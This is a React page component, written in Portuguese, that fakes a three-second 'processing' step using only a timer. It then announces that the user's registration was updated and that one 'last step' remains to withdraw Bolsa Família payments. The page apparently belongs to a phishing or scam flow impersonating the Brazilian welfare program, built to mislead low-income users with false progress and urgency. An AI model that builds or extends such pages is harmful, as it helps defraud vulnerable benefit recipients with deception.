import { useEffect, useState } from 'react';
import { useLocation } from 'wouter';
import { useUserStore } from '../store/userStore';

export default function Processando() {
  const [, navigate] = useLocation();
  const { userData } = useUserStore();
  
  // Estado para controlar se já terminou de processar
  const [processCompleted, setProcessCompleted] = useState(false);
  
  // Obter apenas o primeiro nome
  const primeiroNome = userData.nome.split(' ')[0];
  
  useEffect(() => {
    // Após 3 segundos, mostrar a tela de conclusão
    const timer = setTimeout(() => {
      setProcessCompleted(true);
    }, 3000);
    
    return () => clearTimeout(timer);
  }, []);
  
  const handleContinuar = () => {
    navigate('/sucesso');
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Cabeçalho azul */}
      <div className="bg-[#0066b3] text-white p-4 flex items-center justify-center">
        <span className="text-lg font-medium">Processando</span>
      </div>

      <div className="flex-1 flex flex-col justify-center items-center p-6">
        {!processCompleted ? (
          <div className="flex flex-col items-center justify-center">
            {/* Animação de carregamento */}
            <div className="w-16 h-16 border-t-4 border-b-4 border-blue-500 rounded-full animate-spin mb-8"></div>
            <p className="text-lg text-gray-700">Atualizando seu cadastro...</p>
          </div>
        ) : (
          <div className="max-w-sm w-full text-center animate-fadeIn">
            {/* Ícone de sucesso */}
            <div className="flex justify-center mb-8">
              <div className="w-24 h-24 text-green-500">
                <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <circle cx="50" cy="50" r="45" stroke="currentColor" strokeWidth="8" />
                  <path d="M30 50L45 65L70 35" stroke="currentColor" strokeWidth="8" strokeLinecap="round" strokeLinejoin="round" />
                </svg>
              </div>
            </div>
            
            {/* Título */}
            <h1 className="text-2xl font-bold text-green-500 mb-8">
              Cadastro atualizado com sucesso!
            </h1>
            
            {/* Mensagem */}
            <div className="bg-[#f1f9ff] p-4 rounded-lg mb-8">
              <p className="text-gray-700">
                <span className="font-medium">{primeiroNome}</span>, resta apenas uma <span className="font-bold text-red-600">ÚLTIMA ETAPA</span> para sacar suas <span className="font-bold text-red-600">PARCELAS DO BOLSA FAMÍLIA</span>!
              </p>
            </div>
            
            {/* Botão continuar */}
            <button
              type="button"
              className="w-full py-4 bg-[#ee8435] text-white font-medium rounded-md hover:bg-[#df7426] uppercase"
              onClick={handleContinuar}
            >
              CONTINUAR
            </button>
          </div>
        )}
      </div>
    </div>
  );
}